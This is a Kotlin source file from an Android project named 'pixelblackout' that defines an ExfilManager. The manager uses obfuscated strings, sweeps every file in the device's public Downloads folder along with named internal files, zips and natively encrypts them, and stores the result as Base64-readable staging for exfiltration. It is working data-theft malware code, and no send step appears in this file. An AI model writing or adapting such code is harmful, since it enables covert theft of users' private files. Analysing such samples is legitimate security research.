package com.example.pixelblackout.managers

import android.content.Context
import android.os.Environment
import android.util.Base64
import com.example.pixelblackout.nativebridge.NativeCrypto
import com.example.pixelblackout.utils.StringVault
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object ExfilManager {
    private val EXFIL_DIR = StringVault.reveal("U0hE")
    private val ARCHIVE_NAME = StringVault.reveal("QVZNR09GDUFKTQ==")
    private val LOG_DIR = StringVault.reveal("QEJAS0YT")
    private val LOG_FILE = StringVault.reveal("U0hEDU9MRA==")
    private val watchList = arrayOf(StringVault.reveal("QEVEDFNRTEVKT0YNR0JX"))
    fun prepare(context: Context) {
        log(context, "Preparing package")
        val folder = File(context.filesDir, EXFIL_DIR)
        if (!folder.exists()) {
            folder.mkdirs()
        }
        val packageFile = File(folder, ARCHIVE_NAME)
        val targets = collectTargets(context)
        log(context, "Queued ${targets.size} file(s) for packaging")
        if (targets.isEmpty()) {
            packageFile.delete()
            log(context, "No targets discovered; deleted existing bundle")
            return
        }
        val zipData = zipFiles(targets)
        val encrypted = NativeCrypto.encryptArchive(zipData)
        packageFile.writeBytes(encrypted)
        log(context, "Wrote encrypted payload (${encrypted.size} bytes) to ${packageFile.absolutePath}")
    }

    fun readPackage(context: Context): String? {
        val file = File(context.filesDir, "$EXFIL_DIR/$ARCHIVE_NAME")
        if (!file.exists()) return null
        val bytes = file.readBytes()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    private fun collectTargets(context: Context): List<Pair<File, String>> {
        val results = mutableListOf<Pair<File, String>>()
        watchList.forEach { name ->
            val file = File(context.filesDir, name)
            if (file.exists()) {
                val entry = name.replace(File.separatorChar, '/')
                results += file to entry
                log(context, "Queued internal file $entry (${file.length()} bytes)")
            }
        }

        val downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        if (downloads != null && downloads.exists()) {
            log(context, "Scanning downloads directory ${downloads.absolutePath}")
            runCatching {
                downloads.walkTopDown().filter { it.isFile }.forEach { file ->
                    val relative = file.relativeToOrNull(downloads)?.path ?: file.name
                    val entry = ("downloads/" + relative).replace(File.separatorChar, '/')
                    results += file to entry
                    log(context, "Queued external file $entry (${file.length()} bytes)")
                }
            }.onFailure { error ->
                log(context, "Failed to scan downloads: ${error::class.java.simpleName}:${error.message}")
            }
        }

        return results
    }

    private fun zipFiles(files: List<Pair<File, String>>): ByteArray {
        val outputStream = ByteArrayOutputStream()
        ZipOutputStream(outputStream).use { zip ->
            files.forEach { (file, entryName) ->
                zip.putNextEntry(ZipEntry(entryName))
                file.inputStream().use { input ->
                    input.copyTo(zip)
                }
                zip.closeEntry()
            }
        }
        return outputStream.toByteArray()
    }

    private fun log(context: Context, message: String) {
        runCatching {
            val dir = File(context.filesDir, LOG_DIR)
            if (!dir.exists()) {
                dir.mkdirs()
            }
            val stamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            File(dir, LOG_FILE).appendText("[$stamp] $message\n")
        }
    }
}
